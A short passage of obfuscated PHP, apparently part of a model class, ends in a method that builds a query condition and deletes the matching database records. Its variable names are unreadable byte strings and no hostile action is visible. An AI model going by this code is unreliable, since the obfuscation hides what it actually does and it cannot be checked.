$EŒä™ê½˜’[384] => $a¸´ê¼¸ñ–, $EŒä™ê½˜’[432] => array($EŒä™ê½˜’[935], 0)); return $this->where($F‡«¹·åğè)->delete(); } }